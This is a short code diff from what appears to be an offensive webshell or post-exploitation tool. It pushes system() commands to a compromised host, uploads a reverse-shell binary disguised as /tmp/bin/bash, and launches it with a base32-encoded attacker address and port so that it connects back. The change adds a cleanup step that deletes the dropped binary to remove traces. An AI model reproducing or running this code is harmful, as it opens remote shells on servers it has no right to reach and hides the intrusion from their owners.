@@ -26,7 +26,7 @@ def run(lhost: str, port: int):
     send("system('mkdir /tmp/bin');")
     if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/bin/bash", True):
         return
-    t = Thread(target=delay_send, args=(2, "system('cd /tmp && chmod +x bin/bash && bin/bash %s');" % b32encode(f"{lhost} {port}".encode()).decode()))
+    t = Thread(target=delay_send, args=(2, "system('cd /tmp && chmod +x bin/bash && bin/bash %s && rm -rf bin');" % b32encode(f"{lhost} {port}".encode()).decode()))
     t.setDaemon(True)
     t.start()
     print(f"Bind port {color.yellow(str(port))}...\n")
